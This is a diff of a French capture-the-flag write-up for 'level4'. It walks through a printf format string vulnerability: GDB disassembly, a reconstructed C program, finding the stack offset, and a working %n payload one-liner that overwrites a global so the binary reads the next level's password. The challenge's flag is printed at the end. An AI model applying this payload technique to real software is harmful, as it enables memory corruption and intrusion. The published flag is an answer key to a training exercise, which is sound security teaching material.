@@ -1,85 +1,88 @@
-### Level 4
+# Level 4
 
-## Etape 1: Observation initiale du comportement
-
-- On lance le programme pour voir ce qu'il fait:
+## Étape 1 : Observer le comportement
 
 ```bash
 ./level4
 test
 test
 ```
-
-- Le programme lit une entrée et l'affiche
+Le programme lit l'input et l'affiche.
 
 ```bash
-./level4
-%p
-0xb7ff26b0
 ./level4
 %x
 b7ff26b0
 ```
+Le `%x` est interprété → **Format string vulnerability**.
 
-- Le %px etc est interprété
-- Le programme utilise printf() sans format fixe
-
-## Etape 2: Analyse statique avec GDB
-
-- Desassemblons pour comprendre la structure:
+## Étape 2 : Analyser avec GDB
 
 ```bash
 gdb ./level4
 (gdb) disas main
-[...]
-   0x080484ad <+6>:	call   0x8048457 <n>
-[...]
 ```
-
-- On voit que main() appelle simplement une fonction n():
+`main()` appelle `n()`.
 
 ```bash
 (gdb) disas n
 ```
 
-- Points clés dans la fonction n():
-1. Elle appelle fgets()
-2. Elle appelle une fonction p() avec notre input
-3. Elle compare une valeur en mémoire avec 0x1025544
-
-```bash
-0x08048488 <+49>:	call   0x8048444 <p>
-0x0804848d <+54>:	mov    0x8049810,%eax
-0x08048492 <+59>:	cmp    $0x1025544,%eax
-0x08048497 <+64>:	jne    0x80484a5 <n+78>
-0x08048499 <+66>:	movl   $0x8048590,(%esp)
-0x080484a0 <+73>:	call   0x8048360 <system@plt>
+**Points clés** :
+```assembly
+0x0804847a <+35>: call   0x8048350 <fgets@plt>    # Lit l'input
+0x08048488 <+49>: call   0x8048444 <p>             # Appelle p(buffer)
+0x0804848d <+54>: mov    0x8049810,%eax            # Charge m dans eax
+0x08048492 <+59>: cmp    $0x1025544,%eax           # Compare m avec 0x1025544
+0x08048497 <+64>: jne    0x80484a5                 # Si différent, exit
+0x08048499 <+66>: movl   $0x8048590,(%esp)         # Sinon, prépare system()
+0x080484a0 <+73>: call   0x8048360 <system@plt>    # Exécute system()
 ```
- 
-- Le programme lit la valeur (m) à l'adresse 0x8049810 
-- Il compare la valeur (m) avec 0x1025544 (16930116 en décimal)
-- Si égal: il exécute system() avec un argument
-- Sinon: le programme se termine
 
-- On regarde la fonction p():
+**Traduction** :
+- Variable `m` à l'adresse `0x8049810`
+- Condition : `if (m == 0x1025544)` → `if (m == 16930116)`
+- Si vrai → `system()` spawne un shell
 
 ```bash
 (gdb) disas p
 ```
-
-```bash
-[...]
-0x0804844a <+6>:	mov    0x8(%ebp),%eax
-0x0804844d <+9>:	mov    %eax,(%esp)
-0x08048450 <+12>:	call   0x8048340 <printf@plt>
-[...]
+```assembly
+0x0804844a <+6>:  mov    0x8(%ebp),%eax
+0x0804844d <+9>:  mov    %eax,(%esp)
+0x08048450 <+12>: call   0x8048340 <printf@plt>
 ```
 
-- p() appelle printf() directement avec notre input comme format str
+**La faille** : `p()` fait `printf(input)` → format string vulnerability.
 
-## Etape 3: Exploitation: Trouver la position sur la stack
+## Étape 3 : Code C reconstitué
 
-- Comme level3, on doit trouver ou notre input apparait sur la stack:
+```c
+int m;  // Variable globale à 0x8049810
+
+void p(char *str) {
+    printf(str);  // faille
+}
+
+void n(void) {
+    char buffer[512];
+    fgets(buffer, 512, stdin);
+    p(buffer);
+    
+    if (m == 16930116) {  // 0x1025544
+        system("/bin/cat /home/user/level5/.pass");
+    }
+}
+
+int main(void) {
+    n();
+    return 0;
+}
+```
+
+**Objectif** : Modifier `m` pour qu'elle vaille `16930116`.
+
+## Étape 4 : Trouver la position sur la stack
 
 ```bash
 ./level4
@@ -87,39 +90,48 @@ AAAA %x %x %x %x %x %x %x %x %x %x %x %x
 AAAA b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 41414141
 ```
 
-41414141 = "AAAA" en hexadecimal: notre input est à la 12eme position
+`41414141` = "AAAA" en hexadécimal → **Position 12**.
 
-## Etape 4: Construction du payload
+## Étape 5 : Construire le payload
 
-- Pour exploiter avec %n, on a besoin de :
-
+**Formule** :
 ```
-[ADDR_CIBLE] + [PADDING] + [%n a la bonne position]
+[ADRESSE_CIBLE] + [PADDING] + [%n]
 ```
 
-Calcul:
-- Adresse cible: 0x8049810 (en little-endian: \x10\x98\x04\x08)
-- Valeur à écrire: 16930116 (valeur comparé)
-- On ecrit deja 4 bytes (l'adresse): il faut écrire encore 16930116 - 4 = 16930112 (chars)
-- Position : 12
+**Calculs** :
+- Adresse de `m` : `0x8049810` → little-endian : `\x10\x98\x04\x08`
+- Valeur à écrire : `16930116`
+- Déjà affiché : `4` bytes (l'adresse)
+- Padding nécessaire : `16930116 - 4 = 16930112`
+- Position : `12`
 
-- Payload final:
+**Payload** :
 ```python
 python -c "print('\x10\x98\x04\x08' + '%16930112u' + '%12\$n')"
 ```
 
-Decomposition:
-- \x10\x98\x04\x08: l'adresse de m
-- %16930112u: affiche un nombre sur 16930112 caractères (padding)
-- %12$n: ecrit le nombre total de caractsres affichés a l'adresse en 12eme position (notre adresse)
+**Décomposition** :
+1. `\x10\x98\x04\x08` → adresse de `m` (4 bytes)
+2. `%16930112u` → affiche 16930112 caractères (padding)
+3. `%12$n` → écrit le total (16930116) à l'adresse en position 12
 
-## Etape 5: Exploitation
+**Comment %n fonctionne** :
+1. `printf` affiche 16930116 caractères au total
+2. `printf` voit `%12$n`
+3. `printf` va en position 12 de la stack
+4. `printf` trouve : `0x08049810`
+5. `printf` écrit `16930116` à l'adresse `0x08049810`
+
+## Étape 6 : Exploitation
 
 ```bash
 (python -c "print('\x10\x98\x04\x08' + '%16930112u' + '%12\$n')"; cat) | ./level4
 ```
 
-- Le ;cat garde stdin ouvert pour que le shell reste interactif
+Le `;cat` garde stdin ouvert pour le shell.
 
-- Flag:
-0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+**Résultat** :
+
+**Flag** : `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
+
